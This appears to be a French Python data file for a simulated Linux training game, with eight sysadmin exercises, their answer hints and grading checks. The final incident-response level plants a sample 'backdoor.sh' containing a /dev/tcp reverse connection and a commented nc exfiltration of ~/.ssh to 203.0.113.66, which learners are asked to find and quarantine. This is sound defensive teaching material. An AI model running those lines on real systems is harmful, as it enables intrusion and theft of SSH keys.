"""
PARCOURS STATIQUE N°1 — « Linux Essentials : les fondations »
================================================================
Premier parcours figé de la plateforme. Aucune génération IA : chaque
niveau est rédigé, testé et validé à la main. L'IA n'intervient plus que
comme assistante pédagogique côté joueur.

Chaque niveau suit le schéma du catalogue (voir backend/app/catalog/__init__.py).
Les checks de `expected_state` sont tous atteignables avec le moteur
déterministe — testés dans backend/app/tests/test_linux_engine.py.
"""

GAME = {
    "slug": "linux-essentials",
    "name": "Linux Essentials",
    "tagline": "De ton premier `pwd` à ton premier incident de sécurité.",
    "description": (
        "Tu débutes comme administrateur système junior chez Meridian Corp. "
        "Au fil de 8 défis réalistes, tu apprends à naviguer dans le système de "
        "fichiers, lire des logs, organiser des données, verrouiller des "
        "permissions, gérer des processus… jusqu'à gérer ton premier incident "
        "de sécurité. Le terminal est simulé par notre moteur déterministe : "
        "tout se passe comme sur un vrai serveur, sans aucun risque."
    ),
    "domain": "linux",
    "level": "beginner",
    "difficulty": 1,
    "duration_minutes": 90,
    "skills": [
        "Navigation dans l'arborescence",
        "Manipulation de fichiers",
        "Recherche et filtrage de texte",
        "Permissions Unix",
        "Gestion des processus",
        "Réponse à incident",
    ],
    "version": "1.0.0",
    "levels": [
        # ------------------------------------------------------------------
        # NIVEAU 1
        # ------------------------------------------------------------------
        {
            "title": "Premiers pas dans le terminal",
            "situation_probleme": (
                "Premier jour chez Meridian Corp. On vient de te créer un compte "
                "sur **meridian**, le serveur de la filiale. Ton chef te laisse "
                "une heure pour prendre tes marques : « Connecte-toi, regarde "
                "où tu es, et fouille un peu ton dossier personnel. » "
                "Le terminal te fait un peu peur ? Normal. Dans cinq minutes, il "
                "sera ton meilleur outil."
            ),
            "consigne": [
                "Affiche ton répertoire de travail courant (où es-tu ?).",
                "Affiche ton nom d'utilisateur et le nom de la machine.",
                "Liste le contenu de ton dossier personnel.",
                "Liste le contenu du dossier `Documents` (utilise le chemin relatif).",
                "Lis le fichier `readme.md` — ton chef y a laissé un mot.",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 1\n\n"
                "## Se situer\n"
                "- `pwd` — affiche le répertoire courant (**p**rint **w**orking **d**irectory)\n"
                "- `whoami` — affiche l'utilisateur courant\n"
                "- `hostname` — affiche le nom de la machine\n"
                "- `uname -a` — informations sur le système\n\n"
                "## Lister\n"
                "- `ls` — liste le contenu du répertoire courant\n"
                "- `ls Documents` — liste un sous-dossier (chemin relatif)\n"
                "- `ls -a` — inclut les fichiers cachés (qui commencent par `.`)\n\n"
                "## Lire\n"
                "- `cat readme.md` — affiche le contenu d'un fichier\n\n"
                "## Vocabulaire\n"
                "- `~` désigne ton dossier personnel (`/home/user`)\n"
                "- Un **chemin relatif** s'écrit depuis l'endroit où tu te trouves ;"
                " un **chemin absolu** commence par `/`"
            ),
            "objective": "Prendre en main le terminal : savoir où l'on est, qui l'on est, et ce qui nous entoure.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {
                        "/home/user": {"is_dir": True, "perms": "750", "owner": "user"},
                        "/home/user/readme.md": {
                            "content": (
                                "# Bienvenue à bord !\n\n"
                                "Si tu lis ce fichier, ton terminal fonctionne. \n\n"
                                "Quelques règles de la maison :\n"
                                "1. On ne lance jamais une commande qu'on ne comprend pas.\n"
                                "2. Le manuel est ton ami : man <commande>\n"
                                "3. Le mot de passe du défi 6 est caché quelque part sur ce serveur.\n\n"
                                "— N. Kadjo, responsable infrastructure\n"
                            ),
                            "perms": "644",
                        },
                        "/home/user/notes.txt": {
                            "content": "Courses : café, câble RJ45, café.\n",
                            "perms": "600",
                        },
                        "/home/user/Documents": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/home/user/Documents/planning_equipe.txt": {
                            "content": (
                                "Lundi   — onboarding recrue\n"
                                "Mardi   — maintenance serveur meridian (22h)\n"
                                "Jeudi   — revue des sauvegardes\n"
                            ),
                            "perms": "644",
                        },
                        "/home/user/Downloads": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/home/user/Downloads/manuel_linux.pdf": {
                            "content": "[PDF binaire simulé — 4,2 Mo]",
                            "perms": "644",
                            "size": 4404019,
                        },
                    },
                },
                "responses": [],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [],
                "files_not_exists": [],
                "commands_used": ["pwd", "ls"],
            },
            "hints": [
                "La commande pour savoir où tu te trouves tient en 3 lettres : Print Working Directory.",
                "Pour lister un sous-dossier, tu peux écrire `ls Documents` sans quitter ton répertoire.",
                "Pour lire un fichier : `cat readme.md`.",
            ],
            "difficulty": 1,
            "points": 100,
            "time_limit": 600,
        },
        # ------------------------------------------------------------------
        # NIVEAU 2
        # ------------------------------------------------------------------
        {
            "title": "À la recherche du fichier de configuration",
            "situation_probleme": (
                "Le logiciel de sauvegarde de Meridian refuse de démarrer. Ton chef "
                "te transmet le ticket : « Le fichier de configuration `backup.conf` "
                "est quelque part sous `/etc`, dans un sous-dossier. Retrouve-le, "
                "lis-le, et note-moi la valeur de `API_KEY` dans un fichier "
                "`verification.txt` sur ton dossier personnel pour prouver que tu "
                "l'as bien lu. »"
            ),
            "consigne": [
                "Explore `/etc` pour localiser le fichier `backup.conf` (`find` est ton ami).",
                "Affiche le contenu du fichier une fois trouvé.",
                "Repère la ligne `API_KEY=...`.",
                "Crée le fichier `/home/user/verification.txt` contenant exactement la clé.",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 2\n\n"
                "## Chercher\n"
                "- `find /etc -name \"backup.conf\"` — cherche par nom exact\n"
                "- `find /etc -name \"*.conf\"` — avec joker\n"
                "- `find / -name \"backup.conf\" 2>/dev/null` — depuis la racine\n\n"
                "## Naviguer\n"
                "- `cd /etc/meridian` — se déplacer (chemin absolu)\n"
                "- `cd ..` — remonter d'un niveau\n"
                "- `cd` ou `cd ~` — retour au dossier personnel\n\n"
                "## Écrire un fichier\n"
                "- `echo \"TEXTE\" > fichier` — crée/écrase avec TEXTE\n"
                "- `echo \"TEXTE\" >> fichier` — ajoute à la fin\n\n"
                "## Vérifier ton travail\n"
                "- `cat verification.txt` — relis ce que tu as écrit"
            ),
            "objective": "Retrouver un fichier de configuration dans l'arborescence et extraire une information clé.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {
                        "/etc/meridian": {"is_dir": True, "perms": "755", "owner": "root", "group": "root"},
                        "/etc/meridian/backup.conf": {
                            "content": (
                                "# Configuration du service de sauvegarde Meridian\n"
                                "BACKUP_ROOT=/data/backups\n"
                                "SCHEDULE=02:30\n"
                                "RETENTION_DAYS=30\n"
                                "API_KEY=MERIDIAN-7F3K-2026\n"
                                "NOTIFY=admin@meridian.corp\n"
                            ),
                            "perms": "644",
                            "owner": "root",
                            "group": "root",
                        },
                        "/etc/meridian/README": {
                            "content": "Ne pas modifier sans validation de l'infra.\n",
                            "perms": "644",
                            "owner": "root",
                            "group": "root",
                        },
                        "/etc/meridian/scripts": {"is_dir": True, "perms": "755", "owner": "root", "group": "root"},
                        "/etc/meridian/scripts/pre_backup.sh": {
                            "content": "#!/bin/bash\necho \"Preparation sauvegarde...\"\n",
                            "perms": "755",
                            "owner": "root",
                            "group": "root",
                        },
                    },
                },
                "responses": [
                    {
                        "match": "systemctl status meridian-backup",
                        "output": (
                            "● meridian-backup.service - Meridian Backup Daemon\n"
                            "     Loaded: loaded (/lib/systemd/system/meridian-backup.service; enabled)\n"
                            "     Active: failed (Result: exit-code) since Thu 2026-01-01 07:42:11 UTC\n"
                            "   Main PID: 812 (code=exited, status=1/FAILURE)\n"
                            "\n"
                            "janv. 01 07:42:11 meridian backupd[812]:Erreur: configuration introuvable ou invalide.\n"
                        ),
                    },
                ],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [
                    {
                        "path": "/home/user/verification.txt",
                        "content_contains": "MERIDIAN-7F3K-2026",
                    },
                ],
                "files_not_exists": [],
                "commands_used": ["find"],
            },
            "hints": [
                "`find /etc -name \"backup.conf\"` localise le fichier en une commande.",
                "Une fois trouvé : `cat /etc/meridian/backup.conf` (ou déplace-toi avec `cd`).",
                "Pour créer le fichier : `echo \"MERIDIAN-7F3K-2026\" > /home/user/verification.txt`.",
            ],
            "difficulty": 2,
            "points": 120,
            "time_limit": 720,
        },
        # ------------------------------------------------------------------
        # NIVEAU 3
        # ------------------------------------------------------------------
        {
            "title": "Le log qui en dit long",
            "situation_probleme": (
                "Alerte remontée par le monitoring : des tentatives de connexion "
                "SSH suspectes auraient eu lieu cette nuit sur meridian. On te "
                "confie `/var/log/auth.log`. Ton chef veut un chiffre précis avant "
                "la réunion de 11h : **combien de tentatives de mot de passe ont "
                "échoué ?** Note le nombre dans `/home/user/audit/echecs.txt`."
            ),
            "consigne": [
                "Affiche les premières lignes du log pour comprendre sa structure (`head`).",
                "Affiche les dernières lignes (`tail`).",
                "Compte les lignes contenant `Failed password` (`grep -c` ou un tube vers `wc -l`).",
                "Crée le dossier `audit` dans ton dossier personnel.",
                "Écris le nombre trouvé dans `/home/user/audit/echecs.txt` (le chiffre seul suffit).",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 3\n\n"
                "## Lire un log\n"
                "- `head /var/log/auth.log` — 10 premières lignes\n"
                "- `tail -n 20 /var/log/auth.log` — 20 dernières lignes\n"
                "- `cat /var/log/auth.log` — tout le fichier\n\n"
                "## Filtrer\n"
                "- `grep \"Failed password\" /var/log/auth.log` — lignes correspondantes\n"
                "- `grep -c \"Failed password\" /var/log/auth.log` — compte les lignes\n"
                "- `grep -i admin /var/log/auth.log` — ignore la casse\n\n"
                "## Les tubes (pipes)\n"
                "- `grep \"Failed password\" /var/log/auth.log | wc -l` — même résultat en deux temps\n"
                "- La sortie de gauche alimente l'entrée de droite\n\n"
                "## Créer puis écrire\n"
                "- `mkdir audit` puis `echo 8 > audit/echecs.txt`\n"
                "- `wc -l fichier` — compte les lignes d'un fichier"
            ),
            "objective": "Extraire une information fiable d'un fichier de log en combinant grep, head, tail et les tubes.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {
                        "/var/log/auth.log": {
                            "content": (
                                "Jan  1 06:12:03 meridian sshd[1201]: Accepted password for user from 10.0.2.2 port 51234 ssh2\n"
                                "Jan  1 06:12:03 meridian systemd-logind[912]: New session 3 of user user.\n"
                                "Jan  1 06:41:19 meridian sshd[1244]: Failed password for admin from 203.0.113.45 port 60122 ssh2\n"
                                "Jan  1 06:41:22 meridian sshd[1244]: Failed password for admin from 203.0.113.45 port 60124 ssh2\n"
                                "Jan  1 06:41:25 meridian sshd[1244]: Failed password for admin from 203.0.113.45 port 60126 ssh2\n"
                                "Jan  1 06:41:28 meridian sshd[1244]: error: maximum authentication attempts exceeded\n"
                                "Jan  1 07:02:51 meridian sudo:     user : TTY=pts/0 ; PWD=/home/user ; COMMAND=/usr/bin/apt update\n"
                                "Jan  1 07:15:08 meridian sshd[1302]: Failed password for root from 203.0.113.45 port 44812 ssh2\n"
                                "Jan  1 07:15:11 meridian sshd[1302]: Failed password for root from 203.0.113.45 port 44814 ssh2\n"
                                "Jan  1 07:15:14 meridian sshd[1302]: Failed password for root from 203.0.113.45 port 44816 ssh2\n"
                                "Jan  1 07:16:40 meridian sshd[1310]: Accepted password for user from 10.0.2.2 port 51890 ssh2\n"
                                "Jan  1 07:44:02 meridian systemd-logind[912]: Session 4 logged out.\n"
                                "Jan  1 08:03:37 meridian sshd[1399]: Failed password for invalid user oracle from 198.51.100.7 port 33210 ssh2\n"
                                "Jan  1 08:03:40 meridian sshd[1399]: Failed password for invalid user oracle from 198.51.100.7 port 33212 ssh2\n"
                                "Jan  1 08:03:43 meridian sshd[1399]: Failed password for invalid user oracle from 198.51.100.7 port 33214 ssh2\n"
                                "Jan  1 08:05:19 meridian CRON[1402]: pam_unix(cron:session): session opened for user backup\n"
                                "Jan  1 08:30:00 meridian systemd[1]: Starting Daily apt download activities...\n"
                            ),
                            "perms": "644",
                            "owner": "root",
                            "group": "root",
                        },
                    },
                },
                "responses": [],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [
                    {"path": "/home/user/audit", "type": "dir"},
                    {"path": "/home/user/audit/echecs.txt", "content_contains": "9"},
                ],
                "files_not_exists": [],
                "commands_used": ["grep"],
            },
            "hints": [
                "Commence par `head /var/log/auth.log` puis `grep \"Failed password\" /var/log/auth.log`.",
                "Pour compter : `grep -c \"Failed password\" /var/log/auth.log`.",
                "Il y a 9 échecs (6 pour admin+root… vérifie bien, il y en a aussi pour un utilisateur invalide). Puis `mkdir audit` et `echo 9 > audit/echecs.txt`.",
            ],
            "difficulty": 3,
            "points": 140,
            "time_limit": 900,
        },
        # ------------------------------------------------------------------
        # NIVEAU 4
        # ------------------------------------------------------------------
        {
            "title": "Grand nettoyage avant la sauvegarde",
            "situation_probleme": (
                "Ce soir, sauvegarde complète du dossier `projects`. Problème : il "
                "déborde de brouillons et de fichiers temporaires. Ton chef exige "
                "que seuls les **projets actifs** soient sauvegardés, et que les "
                "archives soient rangées dans un dossier dédié. À toi de faire le "
                "tri — proprement, sans rien perdre."
            ),
            "consigne": [
                "Crée un dossier `archive` dans ton dossier personnel.",
                "Déplace `brouillon.txt` (dans `projects`) vers `archive`.",
                "Déplace tout le dossier `ancien_projet` vers `archive`.",
                "Copie `TODO.txt` dans `Documents` (l'original doit rester dans `projects`).",
                "Supprime `test_temp.log`.",
                "Crée un fichier vide `lisez_moi.txt` dans `archive`.",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 4\n\n"
                "## Créer\n"
                "- `mkdir archive` — nouveau dossier\n"
                "- `touch archive/lisez_moi.txt` — fichier vide\n\n"
                "## Déplacer / renommer (même commande !)\n"
                "- `mv projects/brouillon.txt archive/`\n"
                "- `mv projects/ancien_projet archive/`\n\n"
                "## Copier\n"
                "- `cp projects/TODO.txt Documents/`\n"
                "- `cp -r dossier destination` — pour un dossier entier\n\n"
                "## Supprimer\n"
                "- `rm projects/test_temp.log`\n"
                "- `rm -r dossier` — suppression récursive (prudence !)\n\n"
                "## Vérifier\n"
                "- `ls projects` / `ls archive` — contrôle visuel après chaque opération"
            ),
            "objective": "Réorganiser une arborescence avec mkdir, mv, cp, rm et touch sans perdre de données.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {
                        "/home/user/Documents": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/home/user/projects": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/home/user/projects/site_vitrine": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/home/user/projects/site_vitrine/index.html": {
                            "content": "<!DOCTYPE html>\n<html><body>Meridian Corp</body></html>\n",
                            "perms": "644",
                        },
                        "/home/user/projects/site_vitrine/style.css": {
                            "content": "body { font-family: sans-serif; }\n",
                            "perms": "644",
                        },
                        "/home/user/projects/ancien_projet": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/home/user/projects/ancien_projet/old_main.py": {
                            "content": "print('deprecated since 2024')\n",
                            "perms": "644",
                        },
                        "/home/user/projects/ancien_projet/notes_v1.txt": {
                            "content": "Version abandonnee du portail interne.\n",
                            "perms": "644",
                        },
                        "/home/user/projects/brouillon.txt": {
                            "content": "Idees en vrac : migrer le DNS, commander un onduleur, revoir les alerts.\n",
                            "perms": "644",
                        },
                        "/home/user/projects/test_temp.log": {
                            "content": "DEBUG 2026-01-01 test unitaire — a supprimer\n",
                            "perms": "644",
                        },
                        "/home/user/projects/TODO.txt": {
                            "content": (
                                "Migration serveur meridian — ETAPE PAR ETAPE\n"
                                "1. Geler les depots git\n"
                                "2. Sauvegarde complete\n"
                                "3. Basculer le DNS\n"
                            ),
                            "perms": "644",
                        },
                    },
                },
                "responses": [],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [
                    {"path": "/home/user/archive", "type": "dir"},
                    {"path": "/home/user/archive/brouillon.txt"},
                    {"path": "/home/user/archive/ancien_projet", "type": "dir"},
                    {"path": "/home/user/archive/lisez_moi.txt"},
                    {"path": "/home/user/Documents/TODO.txt", "content_contains": "Migration"},
                    {"path": "/home/user/projects/TODO.txt", "content_contains": "Migration"},
                ],
                "files_not_exists": [
                    {"path": "/home/user/projects/brouillon.txt"},
                    {"path": "/home/user/projects/test_temp.log"},
                ],
                "commands_used": [],
            },
            "hints": [
                "Une opération par étape : `mkdir archive` d'abord, puis les `mv`.",
                "`mv` déplace ; `cp` copie et laisse l'original en place. Le TODO doit exister aux DEUX endroits.",
                "`rm projects/test_temp.log` supprime le log temporaire ; `touch archive/lisez_moi.txt` crée le fichier vide.",
            ],
            "difficulty": 3,
            "points": 160,
            "time_limit": 900,
        },
        # ------------------------------------------------------------------
        # NIVEAU 5
        # ------------------------------------------------------------------
        {
            "title": "Verrouiller les accès",
            "situation_probleme": (
                "Audit de sécurité la semaine prochaine. En prélude, on te demande "
                "de passer en revue le dossier `vault` du service RH : les règles "
                "de permissions actuelles sont trop laxistes (tout le monde peut "
                "lire les salaires !). Applique la matrice d'accès ci-dessous, "
                "à la lettre."
            ),
            "consigne": [
                "Liste le dossier `vault` en format détaillé pour voir les permissions actuelles.",
                "Lis la matrice d'accès dans `vault/MATRICE.txt`.",
                "`rapport_salaire.txt` → uniquement lisible/écrivable par son propriétaire.",
                "`script_deploiement.sh` → le propriétaire a tous les droits, le groupe peut lire et exécuter, les autres rien.",
                "`public/annonce.txt` → lisible par tous, modifiable par personne d'autre que le propriétaire.",
                "Vérifie le résultat avec `ls -l vault` et `stat`.",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 5\n\n"
                "## Lire les permissions\n"
                "- `ls -l vault` → `-rw-r--r--` : type + propriétaire + groupe + autres\n"
                "- r = 4, w = 2, x = 1 → 7=rwx, 6=rw-, 5=r-x, 0=---\n\n"
                "## Changer les permissions\n"
                "- `chmod 600 vault/rapport_salaire.txt` — notation octale\n"
                "- `chmod u+x script.sh` — notation symbolique (u/g/o/a + - = rwx)\n"
                "- `chmod -R 644 dossier` — récursif\n\n"
                "## Vérifier\n"
                "- `stat vault/rapport_salaire.txt` — permissions octales exactes\n\n"
                "## Repères\n"
                "- `600` fichier privé · `644` fichier public · `750` exécutable privé\n"
                "- `755` exécutable/dossier standard · `777` = DANGER"
            ),
            "objective": "Appliquer une matrice de permissions Unix avec chmod et vérifier le résultat.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {
                        "/home/user/vault": {"is_dir": True, "perms": "750", "owner": "user"},
                        "/home/user/vault/MATRICE.txt": {
                            "content": (
                                "MATRICE D'ACCES — A APPLIQUER AVANT L'AUDIT\n"
                                "rapport_salaire.txt     -> 600 (prive proprietaire)\n"
                                "script_deploiement.sh   -> 750 (exec proprietaire, lecture+exec groupe)\n"
                                "public/annonce.txt      -> 644 (lecture tous, ecriture proprietaire)\n"
                            ),
                            "perms": "644",
                        },
                        "/home/user/vault/rapport_salaire.txt": {
                            "content": "Salaire moyen dev: 52k€ — ops: 52k€ — RH: 48k€\n",
                            "perms": "644",
                        },
                        "/home/user/vault/script_deploiement.sh": {
                            "content": "#!/bin/bash\necho \"Deploiement du portail interne...\"\n",
                            "perms": "644",
                        },
                        "/home/user/vault/public": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/home/user/vault/public/annonce.txt": {
                            "content": "Le self-service sera ferme vendredi de 12h a 14h.\n",
                            "perms": "600",
                        },
                    },
                },
                "responses": [],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [
                    {"path": "/home/user/vault/rapport_salaire.txt", "perms": "600"},
                    {"path": "/home/user/vault/script_deploiement.sh", "perms": "750"},
                    {"path": "/home/user/vault/public/annonce.txt", "perms": "644"},
                ],
                "files_not_exists": [],
                "commands_used": ["chmod"],
            },
            "hints": [
                "Traduis la matrice : 600 = rw-------, 750 = rwxr-x---, 644 = rw-r--r--.",
                "Trois commandes suffisent : `chmod 600 vault/rapport_salaire.txt`, `chmod 750 ...`, `chmod 644 ...`.",
                "Vérifie avec `ls -l vault` ou `stat vault/rapport_salaire.txt` avant de valider.",
            ],
            "difficulty": 4,
            "points": 180,
            "time_limit": 900,
        },
        # ------------------------------------------------------------------
        # NIVEAU 6
        # ------------------------------------------------------------------
        {
            "title": "Qui suis-je sur ce système ?",
            "situation_probleme": (
                "La DRH soupçonne qu'un ancien stagiaire ait laissé un accès "
                "caché. Sur meridian, un rapport confidentiel est rangé dans "
                "`/root` — impossible à lire avec ton compte normal, et c'est "
                "précisément le but. On te confie les clés : ton compte appartient "
                "au groupe `sudo`. Récupère le code d'accès mentionné dans "
                "`/root/rapport_confidentiel.txt` et consigne-le dans "
                "`audit/decouverte.txt` (dans ton dossier personnel)."
            ),
            "consigne": [
                "Vérifie ton identité et tes groupes avec `id`.",
                "Explore `/etc/passwd` : combien y a-t-il de comptes ? Quel est l'UID de `user` ?",
                "Essaie de lire `/root/rapport_confidentiel.txt` sans sudo — observe l'erreur.",
                "Relis le fichier avec les droits administrateur.",
                "Crée le dossier `audit` puis écris le code d'accès dans `audit/decouverte.txt`.",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 6\n\n"
                "## Identité\n"
                "- `whoami` — nom d'utilisateur\n"
                "- `id` — UID, GID et groupes (cherche `sudo` dans la liste !)\n\n"
                "## Les comptes\n"
                "- `cat /etc/passwd` — un compte par ligne : nom:x:UID:GID:...:home:shell\n"
                "- UID 0 = root ; 1-999 = comptes système ; 1000+ = humains\n\n"
                "## Élévation de privilèges\n"
                "- `sudo cat /root/rapport_confidentiel.txt` — exécute en root\n"
                "- Sans sudo sur un fichier 600 root : `Permission denied` (normal !)\n"
                "- `sudo -l` — liste tes droits sudo\n\n"
                "## Consigner\n"
                "- `mkdir -p audit` puis `echo \"CODE\" > audit/decouverte.txt`"
            ),
            "objective": "Comprendre les identités Unix et le fonctionnement de sudo pour accéder à un fichier protégé.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {
                        "/root/rapport_confidentiel.txt": {
                            "content": (
                                "RAPPORT INTERNE — CONFIDENTIEL\n"
                                "Objet: revue des acces suite au depart du stagiaire\n"
                                "Compte detecte actif hors procedure: stagiaire_dev\n"
                                "CODE D'ACCES A COMMUNIQUER A LA DRH: AUTH-MASTER-92X\n"
                                "Recommandation: rotation des cles SSH avant le 15/01.\n"
                            ),
                            "perms": "600",
                            "owner": "root",
                            "group": "root",
                        },
                    },
                },
                "responses": [
                    {
                        "match": "sudo -l",
                        "output": (
                            "[sudo] password for user: \n"
                            "Matching Defaults entries for user on meridian:\n"
                            "    env_reset, mail_badpass, secure_path=/usr/sbin:/usr/bin:/sbin:/bin\n"
                            "\n"
                            "User user may run the following commands on meridian:\n"
                            "    (ALL : ALL) ALL\n"
                        ),
                    },
                ],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [
                    {"path": "/home/user/audit", "type": "dir"},
                    {"path": "/home/user/audit/decouverte.txt", "content_contains": "AUTH-MASTER-92X"},
                ],
                "files_not_exists": [],
                "commands_used": ["sudo"],
            },
            "hints": [
                "`id` montre tes groupes : si tu vois `sudo`, tu peux tout exécuter en root.",
                "`cat /root/rapport_confidentiel.txt` échoue ; réessaie avec `sudo` devant.",
                "Le code est `AUTH-MASTER-92X`. `mkdir -p audit` puis `echo \"AUTH-MASTER-92X\" > audit/decouverte.txt`.",
            ],
            "difficulty": 4,
            "points": 200,
            "time_limit": 900,
        },
        # ------------------------------------------------------------------
        # NIVEAU 7
        # ------------------------------------------------------------------
        {
            "title": "Un processus s'est emballé",
            "situation_probleme": (
                "17h40. Le monitoring hurle : le serveur meridian rame. Un "
                "processus tourne en boucle et consomme presque tout le CPU. "
                "Ton chef est en réunion — c'est à toi d'intervenir. Identifie "
                "le processus fautif et arrête-le. Attention : le service "
                "`restore_daemon` doit continuer de tourner, lui !"
            ),
            "consigne": [
                "Liste tous les processus du système (`ps aux`).",
                "Repère celui qui consomme anormalement de CPU (tu peux trier avec un tube : `ps aux | grep backup`).",
                "Note son PID.",
                "Arrête-le proprement avec `kill` (ou `kill -9` s'il résiste).",
                "Vérifie qu'il a bien disparu et que `restore_daemon` tourne toujours.",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 7\n\n"
                "## Observer\n"
                "- `ps aux` — tous les processus, tous les utilisateurs\n"
                "- `ps aux | grep backup` — filtre les lignes utiles\n"
                "- `top` — vue triée par CPU\n\n"
                "## Colonnes clées\n"
                "- `PID` : identifiant du processus — c'est lui qu'on passe à kill\n"
                "- `%CPU` / `%MEM` : consommation\n"
                "- `STAT` : R (running), S (sleeping), Z (zombie)...\n\n"
                "## Arrêter\n"
                "- `kill 1244` — demande d'arrêt propre (SIGTERM)\n"
                "- `kill -9 1244` — arrêt forcé (SIGKILL), dernier recours\n"
                "- Les processus système (root) ne sont pas tuables sans sudo"
            ),
            "objective": "Identifier un processus gourmand et l'arrêter sans casser le reste du système.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {},
                    "processes": [
                        {
                            "pid": 1244,
                            "name": "backup_loop",
                            "user": "user",
                            "cpu": 97.3,
                            "mem": 12.4,
                            "command": "/usr/bin/backup_loop --continuous",
                        },
                        {
                            "name": "restore_daemon",
                            "user": "user",
                            "cpu": 0.3,
                            "mem": 1.1,
                            "command": "/usr/bin/restore_daemon --watch",
                        },
                        {
                            "name": "indexer",
                            "user": "root",
                            "cpu": 1.2,
                            "mem": 2.0,
                            "command": "/usr/bin/meridian-indexer /data",
                            "system": True,
                        },
                    ],
                },
                "responses": [
                    {
                        "match": "systemctl status backup_loop",
                        "output": (
                            "● backup_loop.service\n"
                            "     Loaded: loaded (/home/user/.config/systemd/user/backup_loop.service; enabled)\n"
                            "     Active: active (running) since Thu 2026-01-01 15:12:44 UTC\n"
                            "   Main PID: 1244 (backup_loop)\n"
                            "      Tasks: 1\n"
                            "     CGroup: /user.slice/user-1000.slice/user@1000.service/backup_loop.service\n"
                            "             └─1244 /usr/bin/backup_loop --continuous\n"
                        ),
                    },
                ],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [],
                "files_not_exists": [],
                "process_not_running": "backup_loop",
                "process_running": "restore_daemon",
                "commands_used": ["ps"],
            },
            "hints": [
                "`ps aux | grep backup` isole les candidats ; regarde la colonne %CPU.",
                "Le coupable tourne avec l'option `--continuous` (PID à repérer dans la liste).",
                "`kill <PID>` suffit. Si tu tue la mauvaise cible, utilise le bouton Réinitialiser pour recommencer le défi.",
            ],
            "difficulty": 5,
            "points": 220,
            "time_limit": 720,
        },
        # ------------------------------------------------------------------
        # NIVEAU 8
        # ------------------------------------------------------------------
        {
            "title": "Mission finale : premier incident",
            "situation_probleme": (
                "08h12. L'IDS vient de déclencher une alerte sur meridian : des "
                "connexions sortantes suspectes vers une IP inconnue. Un script "
                "caché tournerait quelque part sous `/var/tmp`. Plus de chef, plus "
                "de filet : c'est ton premier incident, et la procédure est "
                "claire — **identifier, isoler, neutraliser, documenter**. Tu as "
                "toutes les compétences nécessaires. Bonne chasse."
            ),
            "consigne": [
                "Localise le script suspect : cherche les fichiers `*.sh` sous `/var/tmp` (y compris dans les dossiers cachés).",
                "Lis son contenu et repère l'adresse de l'attaquant.",
                "Repère le processus malveillant dans la liste des processus et arrête-le.",
                "Crée un dossier `quarantine` dans ton dossier personnel.",
                "Déplace le script dans `quarantine`.",
                "Verrouille le script en le rendant inaccessible à tous (`chmod 000`).",
                "Documente l'incident : crée `rapport_incident.txt` dans ton dossier personnel contenant au moins le mot `backdoor` et l'adresse IP de l'attaquant.",
            ],
            "support_technique": (
                "# Aide-mémoire — Niveau 8\n\n"
                "## Identifier\n"
                "- `find /var/tmp -name \"*.sh\"`\n"
                "- `ls -la /var/tmp` — un dossier caché commence par un `.`\n"
                "- `ps aux | grep backdoor` — retrouve le processus\n"
                "- `cat /var/tmp/.hidden_service/backdoor.sh`\n\n"
                "## Neutraliser\n"
                "- `kill <PID>` (ou `kill -9 <PID>`)\n\n"
                "## Isoler\n"
                "- `mkdir quarantine`\n"
                "- `mv /var/tmp/.hidden_service/backdoor.sh quarantine/`\n"
                "- `chmod 000 quarantine/backdoor.sh`\n\n"
                "## Documenter\n"
                "- `echo \"Backdoor neutralisee - IP 203.0.113.66 - dossier quarantine\" > rapport_incident.txt`\n\n"
                "## Méthode IR\n"
                "1. Identifier · 2. Isoler · 3. Neutraliser · 4. Documenter · 5. En rendre compte"
            ),
            "objective": "Gérer un incident complet : trouver, analyser, neutraliser, isoler et documenter une backdoor.",
            "scenario": {
                "initial_state": {
                    "cwd": "/home/user",
                    "host": "meridian",
                    "fs": {
                        "/var/tmp/.hidden_service": {"is_dir": True, "perms": "755", "owner": "user"},
                        "/var/tmp/.hidden_service/backdoor.sh": {
                            "content": (
                                "#!/bin/bash\n"
                                "# --- meridian persistence ---\n"
                                "while true; do\n"
                                "  /bin/sh -c 'exec 3<>/dev/tcp/203.0.113.66/4444; echo connected >&3'\n"
                                "  sleep 30\n"
                                "done\n"
                                "# exfiltration: tar czf - ~/.ssh | nc 203.0.113.66 9001\n"
                            ),
                            "perms": "755",
                            "owner": "user",
                        },
                        "/var/tmp/cleanup.log": {
                            "content": "Routine de nettoyage executee sans erreur.\n",
                            "perms": "644",
                            "owner": "root",
                            "group": "root",
                        },
                    },
                    "processes": [
                        {
                            "pid": 2387,
                            "name": "backdoor.sh",
                            "user": "user",
                            "cpu": 0.9,
                            "mem": 0.6,
                            "command": "/var/tmp/.hidden_service/backdoor.sh",
                        },
                        {
                            "name": "restore_daemon",
                            "user": "user",
                            "cpu": 0.2,
